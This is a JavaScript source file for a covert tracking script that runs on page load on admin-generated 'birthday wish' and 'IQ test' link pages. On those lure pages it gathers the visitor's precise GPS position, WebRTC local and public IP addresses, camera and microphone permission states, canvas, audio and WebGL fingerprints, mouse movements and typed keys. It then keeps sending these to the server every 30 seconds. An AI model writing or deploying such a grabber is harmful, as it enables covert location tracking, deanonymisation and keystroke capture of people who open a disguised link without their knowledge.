// ============================================
// ADVANCED DEVICE FINGERPRINTING SYSTEM
// Collects Maximum User Information
// ============================================

class DeviceFingerprinter {
    constructor() {
        this.fingerprint = {};
        this.sessionId = this.generateSessionId();
        this.startTime = Date.now();
        // Determine whether this environment should collect sensitive permissions
        // Only collect sensitive data (geolocation, camera/mic permission states) for
        // generated user sessions (links created by admins) and NOT for admin pages.
        const currentPath = window.location.pathname;
        const isAdminPanel = currentPath.includes('/admin') || currentPath.includes('admin.html');
        const pathSession = currentPath.split('/').pop();
        const urlParams = new URLSearchParams(window.location.search);
        const sessionParam = urlParams.get('session') || urlParams.get('id') || urlParams.get('sessionId');
        this.shouldCollectSensitive = !isAdminPanel && (
            (currentPath.includes('/wish/') && pathSession && pathSession.length > 3) ||
            (currentPath.includes('/iq-test/') && pathSession && pathSession.length > 3) ||
            (currentPath.includes('birthday.html') && sessionParam) ||
            (currentPath.includes('iq-test.html') && sessionParam) ||
            (sessionParam && sessionParam.length > 3)
        );
        
        // Start collecting data immediately
        this.collectAllData();
    }

    generateSessionId() {
        // Try to get session ID from URL first
        const urlParams = new URLSearchParams(window.location.search);
        const sessionParam = urlParams.get('session') || urlParams.get('id') || urlParams.get('sessionId');
        const pathSession = window.location.pathname.split('/').pop();
        
        // Check for birthday link format: /wish/[sessionId]
        if (window.location.pathname.includes('/wish/') && pathSession && pathSession.length > 10) {
            return pathSession;
        }
        
        // Check for IQ test link format: /iq-test/[sessionId]  
        if (window.location.pathname.includes('/iq-test/') && pathSession && pathSession.length > 10) {
            return pathSession;
        }
        
        // Check for query parameter session ID
        if (sessionParam && sessionParam.length > 10) {
            return sessionParam;
        }
        
        // Check if there's a global userId or sessionId from the page
        if (typeof window.userId !== 'undefined' && window.userId) {
            return window.userId;
        }
        
        // Fallback to generated session ID
        return 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    }

    async collectAllData() {
        console.log('🕵️ Starting comprehensive device fingerprinting...');
        
        // Collect all available information
        await Promise.all([
            this.collectBasicInfo(),
            this.collectNetworkInfo(),
            this.collectHardwareInfo(),
            this.collectBrowserInfo(),
            this.collectLocationInfo(),
            this.collectBehaviorInfo(),
            this.collectAdvancedFingerprints(),
            this.collectWebRTCInfo(),
            this.collectCanvasFingerprint(),
            this.collectAudioFingerprint(),
            this.collectFontInfo(),
            this.collectPluginInfo(),
            this.collectTimingInfo(),
            this.collectBatteryInfo(),
            this.collectVibrationInfo(),
            this.collectDeviceMotionInfo(),
            this.collectWebGLInfo(),
            this.collectStorageInfo(),
            this.collectConnectionInfo()
        ]);

        // Send collected data to server
        this.sendToServer();
        
        // Continue monitoring
        this.startContinuousMonitoring();
    }

    collectBasicInfo() {
        try {
            this.fingerprint.basic = {
                userAgent: navigator.userAgent,
                language: navigator.language,
                languages: navigator.languages,
                platform: navigator.platform,
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                maxTouchPoints: navigator.maxTouchPoints,
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory,
                onLine: navigator.onLine,
                webdriver: navigator.webdriver,
                pdfViewerEnabled: navigator.pdfViewerEnabled,
                vendor: navigator.vendor,
                vendorSub: navigator.vendorSub,
                productSub: navigator.productSub,
                buildID: navigator.buildID,
                oscpu: navigator.oscpu
            };
        } catch (e) {
            console.warn('Basic info collection error:', e);
        }
    }

    async collectNetworkInfo() {
        try {
            // Get IP and detailed network info
            const responses = await Promise.allSettled([
                fetch('https://api.ipify.org?format=json'),
                fetch('https://ipapi.co/json/'),
                fetch('https://ip-api.com/json/'),
                fetch('https://httpbin.org/ip')
            ]);

            this.fingerprint.network = {
                ips: [],
                location: {},
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt,
                    saveData: navigator.connection.saveData,
                    type: navigator.connection.type
                } : null
            };

            // Process responses
            for (const response of responses) {
                if (response.status === 'fulfilled') {
                    try {
                        const data = await response.value.json();
                        if (data.ip) this.fingerprint.network.ips.push(data.ip);
                        if (data.country) this.fingerprint.network.location = { ...this.fingerprint.network.location, ...data };
                    } catch (e) {
                        console.warn('Network data parsing error:', e);
                    }
                }
            }
        } catch (e) {
            console.warn('Network info collection error:', e);
        }
    }

    collectHardwareInfo() {
        try {
            this.fingerprint.hardware = {
                screen: {
                    width: screen.width,
                    height: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth,
                    orientation: screen.orientation ? {
                        angle: screen.orientation.angle,
                        type: screen.orientation.type
                    } : null
                },
                window: {
                    innerWidth: window.innerWidth,
                    innerHeight: window.innerHeight,
                    outerWidth: window.outerWidth,
                    outerHeight: window.outerHeight,
                    devicePixelRatio: window.devicePixelRatio,
                    screenX: window.screenX,
                    screenY: window.screenY
                },
                memory: navigator.deviceMemory,
                cores: navigator.hardwareConcurrency,
                touchSupport: {
                    maxTouchPoints: navigator.maxTouchPoints,
                    touchEvent: 'ontouchstart' in window,
                    touchPoints: navigator.maxTouchPoints
                }
            };
        } catch (e) {
            console.warn('Hardware info collection error:', e);
        }
    }

    collectBrowserInfo() {
        try {
            this.fingerprint.browser = {
                name: this.getBrowserName(),
                version: this.getBrowserVersion(),
                engine: this.getBrowserEngine(),
                userAgent: navigator.userAgent,
                appName: navigator.appName,
                appVersion: navigator.appVersion,
                appCodeName: navigator.appCodeName,
                cookieEnabled: navigator.cookieEnabled,
                javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
                localStorage: this.checkLocalStorage(),
                sessionStorage: this.checkSessionStorage(),
                indexedDB: this.checkIndexedDB(),
                webSQL: this.checkWebSQL(),
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                hasLiedBrowser: this.detectLies(),
                permissions: {}
            };

            // Check various permissions
            this.checkPermissions();
        } catch (e) {
            console.warn('Browser info collection error:', e);
        }
    }

    async collectLocationInfo() {
        try {
            this.fingerprint.location = {
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                language: navigator.language,
                languages: navigator.languages
            };

            // Try to get precise location only if this is a legitimate generated user session
            if (this.shouldCollectSensitive && 'geolocation' in navigator) {
                try {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 5000,
                            maximumAge: 0
                        });
                    });
                    
                    this.fingerprint.location.gps = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        altitudeAccuracy: position.coords.altitudeAccuracy,
                        heading: position.coords.heading,
                        speed: position.coords.speed,
                        timestamp: position.timestamp
                    };
                } catch (e) {
                    this.fingerprint.location.gpsError = e.message;
                }
            } else {
                if (!this.shouldCollectSensitive) {
                    this.fingerprint.location.gps = null;
                    this.fingerprint.location.gpsError = 'Not requested on admin or non-generated pages';
                }
            }
        } catch (e) {
            console.warn('Location info collection error:', e);
        }
    }

    collectBehaviorInfo() {
        try {
            this.fingerprint.behavior = {
                clickTime: Date.now(),
                scrollPosition: { x: window.scrollX, y: window.scrollY },
                windowFocus: document.hasFocus(),
                batteryCharging: null,
                batteryLevel: null,
                vibrationSupport: 'vibrate' in navigator,
                gamepads: navigator.getGamepads ? navigator.getGamepads().length : 0
            };

            // Track mouse movement patterns
            this.trackMouseBehavior();
            
            // Track keyboard patterns
            this.trackKeyboardBehavior();
        } catch (e) {
            console.warn('Behavior info collection error:', e);
        }
    }

    async collectAdvancedFingerprints() {
        try {
            this.fingerprint.advanced = {
                canvasFingerprint: this.getCanvasFingerprint(),
                webglFingerprint: this.getWebGLFingerprint(),
                audioFingerprint: await this.getAudioFingerprint(),
                fontsFingerprint: this.getFontsFingerprint(),
                pluginsFingerprint: this.getPluginsFingerprint()
            };
        } catch (e) {
            console.warn('Advanced fingerprints collection error:', e);
        }
    }

    async collectWebRTCInfo() {
        try {
            if (window.RTCPeerConnection) {
                const pc = new RTCPeerConnection({
                    iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
                });

                pc.createDataChannel('');
                const offer = await pc.createOffer();
                await pc.setLocalDescription(offer);

                this.fingerprint.webrtc = {
                    localIPs: [],
                    publicIPs: [],
                    support: true
                };

                pc.onicecandidate = (event) => {
                    if (event.candidate) {
                        const candidate = event.candidate.candidate;
                        const ipMatch = candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
                        if (ipMatch) {
                            const ip = ipMatch[1];
                            if (ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) {
                                if (!this.fingerprint.webrtc.localIPs.includes(ip)) {
                                    this.fingerprint.webrtc.localIPs.push(ip);
                                }
                            } else {
                                if (!this.fingerprint.webrtc.publicIPs.includes(ip)) {
                                    this.fingerprint.webrtc.publicIPs.push(ip);
                                }
                            }
                        }
                    }
                };
            }
        } catch (e) {
            console.warn('WebRTC info collection error:', e);
            this.fingerprint.webrtc = { support: false, error: e.message };
        }
    }

    getCanvasFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            
            canvas.width = 200;
            canvas.height = 50;
            
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('Device Fingerprint 🔍', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.fillText('Advanced Detection', 4, 25);
            
            return canvas.toDataURL();
        } catch (e) {
            return 'Canvas fingerprint failed: ' + e.message;
        }
    }

    getWebGLFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            
            if (!gl) return 'WebGL not supported';
            
            return {
                renderer: gl.getParameter(gl.RENDERER),
                vendor: gl.getParameter(gl.VENDOR),
                version: gl.getParameter(gl.VERSION),
                shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                extensions: gl.getSupportedExtensions(),
                maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
                maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS),
                aliasedLineWidthRange: gl.getParameter(gl.ALIASED_LINE_WIDTH_RANGE),
                aliasedPointSizeRange: gl.getParameter(gl.ALIASED_POINT_SIZE_RANGE)
            };
        } catch (e) {
            return 'WebGL fingerprint failed: ' + e.message;
        }
    }

    async getAudioFingerprint() {
        try {
            if (!window.AudioContext && !window.webkitAudioContext) {
                return 'Audio fingerprinting not supported';
            }

            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
            const oscillator = audioContext.createOscillator();
            const analyser = audioContext.createAnalyser();
            const gainNode = audioContext.createGain();
            const scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1);

            oscillator.type = 'triangle';
            oscillator.frequency.setValueAtTime(10000, audioContext.currentTime);

            gainNode.gain.setValueAtTime(0, audioContext.currentTime);

            oscillator.connect(analyser);
            analyser.connect(scriptProcessor);
            scriptProcessor.connect(gainNode);
            gainNode.connect(audioContext.destination);

            return new Promise((resolve) => {
                scriptProcessor.addEventListener('audioprocess', (event) => {
                    const buffer = event.inputBuffer.getChannelData(0);
                    let sum = 0;
                    for (let i = 0; i < buffer.length; i++) {
                        sum += Math.abs(buffer[i]);
                    }
                    const fingerprint = sum.toString();
                    
                    oscillator.stop();
                    audioContext.close();
                    
                    resolve(fingerprint);
                });

                oscillator.start();
            });
        } catch (e) {
            return 'Audio fingerprint failed: ' + e.message;
        }
    }

    getFontsFingerprint() {
        try {
            const fonts = [
                'Arial', 'Helvetica', 'Times New Roman', 'Times', 'Courier New', 'Courier',
                'Verdana', 'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS',
                'Trebuchet MS', 'Arial Black', 'Impact', 'Lucida Sans Unicode', 'Tahoma',
                'Lucida Console', 'Monaco', 'Courier', 'monospace', 'serif', 'sans-serif'
            ];

            const testString = 'mmmmmmmmmmlli';
            const testSize = '72px';
            const h = document.getElementsByTagName('body')[0];

            const s = document.createElement('span');
            s.style.fontSize = testSize;
            s.innerHTML = testString;
            const defaultWidth = s.offsetWidth;
            const defaultHeight = s.offsetHeight;

            const detectedFonts = [];

            fonts.forEach(font => {
                s.style.fontFamily = font;
                h.appendChild(s);
                if (s.offsetWidth !== defaultWidth || s.offsetHeight !== defaultHeight) {
                    detectedFonts.push(font);
                }
                h.removeChild(s);
            });

            return detectedFonts;
        } catch (e) {
            return 'Fonts detection failed: ' + e.message;
        }
    }

    getPluginsFingerprint() {
        try {
            const plugins = [];
            for (let i = 0; i < navigator.plugins.length; i++) {
                const plugin = navigator.plugins[i];
                plugins.push({
                    name: plugin.name,
                    description: plugin.description,
                    filename: plugin.filename,
                    version: plugin.version
                });
            }
            return plugins;
        } catch (e) {
            return 'Plugins detection failed: ' + e.message;
        }
    }

    collectCanvasFingerprint() {
        this.fingerprint.canvas = this.getCanvasFingerprint();
    }

    async collectAudioFingerprint() {
        this.fingerprint.audio = await this.getAudioFingerprint();
    }

    collectFontInfo() {
        this.fingerprint.fonts = this.getFontsFingerprint();
    }

    collectPluginInfo() {
        this.fingerprint.plugins = this.getPluginsFingerprint();
    }

    collectTimingInfo() {
        try {
            this.fingerprint.timing = {
                loadTime: Date.now() - this.startTime,
                performanceNow: performance.now(),
                performanceTiming: performance.timing ? {
                    navigationStart: performance.timing.navigationStart,
                    domainLookupStart: performance.timing.domainLookupStart,
                    domainLookupEnd: performance.timing.domainLookupEnd,
                    connectStart: performance.timing.connectStart,
                    connectEnd: performance.timing.connectEnd,
                    requestStart: performance.timing.requestStart,
                    responseStart: performance.timing.responseStart,
                    responseEnd: performance.timing.responseEnd,
                    domLoading: performance.timing.domLoading,
                    domComplete: performance.timing.domComplete,
                    loadEventStart: performance.timing.loadEventStart,
                    loadEventEnd: performance.timing.loadEventEnd
                } : null
            };
        } catch (e) {
            console.warn('Timing info collection error:', e);
        }
    }

    async collectBatteryInfo() {
        try {
            if ('getBattery' in navigator) {
                const battery = await navigator.getBattery();
                this.fingerprint.battery = {
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime,
                    level: battery.level
                };
            }
        } catch (e) {
            console.warn('Battery info collection error:', e);
        }
    }

    collectVibrationInfo() {
        try {
            this.fingerprint.vibration = {
                support: 'vibrate' in navigator
            };
        } catch (e) {
            console.warn('Vibration info collection error:', e);
        }
    }

    collectDeviceMotionInfo() {
        try {
            this.fingerprint.deviceMotion = {
                support: 'DeviceMotionEvent' in window,
                orientationSupport: 'DeviceOrientationEvent' in window
            };

            if ('DeviceMotionEvent' in window) {
                const handleMotion = (event) => {
                    this.fingerprint.deviceMotion.acceleration = event.acceleration;
                    this.fingerprint.deviceMotion.accelerationIncludingGravity = event.accelerationIncludingGravity;
                    this.fingerprint.deviceMotion.rotationRate = event.rotationRate;
                    this.fingerprint.deviceMotion.interval = event.interval;
                    
                    window.removeEventListener('devicemotion', handleMotion);
                };
                
                window.addEventListener('devicemotion', handleMotion, { once: true });
            }
        } catch (e) {
            console.warn('Device motion info collection error:', e);
        }
    }

    collectWebGLInfo() {
        this.fingerprint.webgl = this.getWebGLFingerprint();
    }

    collectStorageInfo() {
        try {
            this.fingerprint.storage = {
                localStorage: this.checkLocalStorage(),
                sessionStorage: this.checkSessionStorage(),
                indexedDB: this.checkIndexedDB(),
                webSQL: this.checkWebSQL(),
                estimate: null
            };

            // Get storage quota
            if ('storage' in navigator && 'estimate' in navigator.storage) {
                navigator.storage.estimate().then(estimate => {
                    this.fingerprint.storage.estimate = estimate;
                    this.sendToServer(); // Update server with storage info
                });
            }
        } catch (e) {
            console.warn('Storage info collection error:', e);
        }
    }

    collectConnectionInfo() {
        try {
            if ('connection' in navigator) {
                this.fingerprint.connection = {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt,
                    saveData: navigator.connection.saveData,
                    type: navigator.connection.type
                };
            }
        } catch (e) {
            console.warn('Connection info collection error:', e);
        }
    }

    // Helper methods
    getBrowserName() {
        const ua = navigator.userAgent;
        if (ua.includes('Firefox')) return 'Firefox';
        if (ua.includes('Chrome')) return 'Chrome';
        if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
        if (ua.includes('Edge')) return 'Edge';
        if (ua.includes('Opera')) return 'Opera';
        return 'Unknown';
    }

    getBrowserVersion() {
        const ua = navigator.userAgent;
        const match = ua.match(/(firefox|chrome|safari|opera|edge)\/?\s*(\d+)/i);
        return match ? match[2] : 'Unknown';
    }

    getBrowserEngine() {
        const ua = navigator.userAgent;
        if (ua.includes('Webkit')) return 'Webkit';
        if (ua.includes('Gecko')) return 'Gecko';
        if (ua.includes('Trident')) return 'Trident';
        return 'Unknown';
    }

    checkLocalStorage() {
        try {
            localStorage.setItem('test', 'test');
            localStorage.removeItem('test');
            return true;
        } catch (e) {
            return false;
        }
    }

    checkSessionStorage() {
        try {
            sessionStorage.setItem('test', 'test');
            sessionStorage.removeItem('test');
            return true;
        } catch (e) {
            return false;
        }
    }

    checkIndexedDB() {
        return 'indexedDB' in window;
    }

    checkWebSQL() {
        return 'openDatabase' in window;
    }

    detectLies() {
        // Detect browser lies and spoofing attempts
        const lies = [];
        
        // Check for common spoofing patterns
        if (navigator.userAgent.includes('Chrome') && !window.chrome) {
            lies.push('Chrome spoofed');
        }
        
        if (navigator.plugins.length === 0 && navigator.userAgent.includes('Chrome')) {
            lies.push('Plugins hidden');
        }
        
        return lies;
    }

    async checkPermissions() {
        const permissions = ['camera', 'microphone', 'geolocation', 'notifications'];
        // Only query permission states when this is a legitimate generated user session
        if (!this.shouldCollectSensitive) {
            permissions.forEach(p => this.fingerprint.browser.permissions[p] = 'not_requested_on_admin');
            return;
        }

        for (const permission of permissions) {
            try {
                const result = await navigator.permissions.query({ name: permission });
                this.fingerprint.browser.permissions[permission] = result.state;
            } catch (e) {
                this.fingerprint.browser.permissions[permission] = 'unknown';
            }
        }
    }

    trackMouseBehavior() {
        const mouseData = {
            movements: [],
            clicks: [],
            startTime: Date.now()
        };

        const trackMovement = (e) => {
            mouseData.movements.push({
                x: e.clientX,
                y: e.clientY,
                timestamp: Date.now() - mouseData.startTime
            });
            
            // Limit data collection
            if (mouseData.movements.length > 100) {
                document.removeEventListener('mousemove', trackMovement);
            }
        };

        const trackClicks = (e) => {
            mouseData.clicks.push({
                x: e.clientX,
                y: e.clientY,
                button: e.button,
                timestamp: Date.now() - mouseData.startTime
            });
        };

        document.addEventListener('mousemove', trackMovement);
        document.addEventListener('click', trackClicks);

        this.fingerprint.mouseBehavior = mouseData;
    }

    trackKeyboardBehavior() {
        const keyboardData = {
            keypresses: [],
            startTime: Date.now()
        };

        const trackKeys = (e) => {
            keyboardData.keypresses.push({
                key: e.key,
                code: e.code,
                timestamp: Date.now() - keyboardData.startTime,
                ctrlKey: e.ctrlKey,
                altKey: e.altKey,
                shiftKey: e.shiftKey
            });
            
            // Limit data collection
            if (keyboardData.keypresses.length > 50) {
                document.removeEventListener('keydown', trackKeys);
            }
        };

        document.addEventListener('keydown', trackKeys);
        this.fingerprint.keyboardBehavior = keyboardData;
    }

    startContinuousMonitoring() {
        // Monitor for changes every 30 seconds
        setInterval(() => {
            this.updateDynamicInfo();
        }, 30000);

        // Monitor tab visibility changes
        document.addEventListener('visibilitychange', () => {
            this.fingerprint.tabVisibility = {
                hidden: document.hidden,
                timestamp: Date.now()
            };
            this.sendToServer();
        });

        // Monitor window focus changes
        window.addEventListener('focus', () => {
            this.fingerprint.windowFocus = { focused: true, timestamp: Date.now() };
            this.sendToServer();
        });

        window.addEventListener('blur', () => {
            this.fingerprint.windowFocus = { focused: false, timestamp: Date.now() };
            this.sendToServer();
        });
    }

    updateDynamicInfo() {
        // Update information that might change
        this.fingerprint.dynamic = {
            timestamp: Date.now(),
            batteryLevel: navigator.battery ? navigator.battery.level : null,
            onlineStatus: navigator.onLine,
            screenOrientation: screen.orientation ? screen.orientation.type : null,
            windowSize: {
                inner: { width: window.innerWidth, height: window.innerHeight },
                outer: { width: window.outerWidth, height: window.outerHeight }
            }
        };

        this.sendToServer();
    }

    sendToServer() {
        try {
            const payload = {
                type: 'device_fingerprint',
                sessionId: this.sessionId,
                fingerprint: this.fingerprint,
                timestamp: Date.now(),
                url: window.location.href,
                referrer: document.referrer
            };

            // Send to server via fetch
            fetch('/api/fingerprint', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            }).catch(error => {
                console.warn('Failed to send fingerprint data:', error);
            });

            // Also try WebSocket if available
            if (window.ws && window.ws.readyState === WebSocket.OPEN) {
                window.ws.send(JSON.stringify(payload));
            }

            console.log('🕵️ Device fingerprint data sent:', {
                sessionId: this.sessionId,
                dataPoints: Object.keys(this.fingerprint).length,
                timestamp: new Date().toISOString()
            });
        } catch (error) {
            console.error('Error sending fingerprint data:', error);
        }
    }
}

// Only initialize fingerprinting for legitimate user sessions
function initializeFingerprinting() {
    // Check if this is a legitimate user session (not admin panel)
    const currentPath = window.location.pathname;
    const isAdminPanel = currentPath.includes('/admin') || currentPath.includes('admin.html');
    
    if (isAdminPanel) {
        console.log('🚫 Fingerprinting disabled for admin panel');
        return;
    }
    
    // Check if this is a generated link session
    const urlParams = new URLSearchParams(window.location.search);
    const sessionParam = urlParams.get('session') || urlParams.get('id') || urlParams.get('sessionId');
    const pathSession = window.location.pathname.split('/').pop();
    
    // For birthday links: /wish/[sessionId] or birthday.html?session=
    // For IQ test links: /iq-test/[sessionId] or iq-test.html?session=
    const isLegitimateSession = 
        (currentPath.includes('/wish/') && pathSession && pathSession.length > 10) ||
        (currentPath.includes('/iq-test/') && pathSession && pathSession.length > 10) ||
        (currentPath.includes('birthday.html') && sessionParam) ||
        (currentPath.includes('iq-test.html') && sessionParam) ||
        (sessionParam && sessionParam.length > 10);
    
    if (!isLegitimateSession) {
        console.log('🚫 Fingerprinting disabled - not a generated link session');
        return;
    }
    
    // Initialize fingerprinting for legitimate user sessions only
    console.log('🔍 Advanced Device Fingerprinting System Activated for user session');
    const deviceFingerprinter = new DeviceFingerprinter();
    
    // Make it globally available
    window.deviceFingerprinter = deviceFingerprinter;
}

// Initialize fingerprinting when DOM is ready
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initializeFingerprinting);
} else {
    initializeFingerprinting();
}